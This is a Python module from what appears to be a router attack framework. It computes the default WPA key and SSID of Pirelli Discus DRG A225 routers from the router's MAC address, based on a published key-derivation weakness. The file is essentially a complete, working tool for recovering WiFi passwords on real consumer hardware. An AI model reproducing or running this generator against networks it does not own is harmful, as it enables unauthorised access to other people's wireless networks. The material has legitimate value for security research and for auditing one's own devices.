# Name:Pirelli Discus DRG A225 WiFi router default WPA generator
# File:drg_a255_mac2wpa.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 24.7.2015
# Last modified: 24.7.2015
# Shodan Dork:
# Description: Generates WPA key for Pirelli Discus DRG A225 (used e.g. by Croatian T-com)
# Based on work of Muris Kurgas
# http://www.remote-exploit.org/content/Pirelli_Discus_DRG_A225_WiFi_router.pdf

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:Pirelli Discus DRG A225 WiFi router default WPA generator
File:drg_a255_mac2wpa.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 24.7.2015
Description: Generates WPA key for Pirelli Discus DRG A225 (used e.g. by Croatian T-com)
Based on: Work of Muris Kurgas http://www.remote-exploit.org/content/Pirelli_Discus_DRG_A225_WiFi_router.pdf

Options:
    Name        Description

    mac         MAC address used as input for WPA password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")

        const = int('D0EC31', 16)
        inp = int(mac[6:], 16)
        result = (inp - const)//4
        ssid = "Discus--"+mac[6:]
        key = "YW0" + str(result)

        print_success("WPA key generated")
        print("Possible SSID: " + ssid)
        print("WPA Key: " + key)

Misc()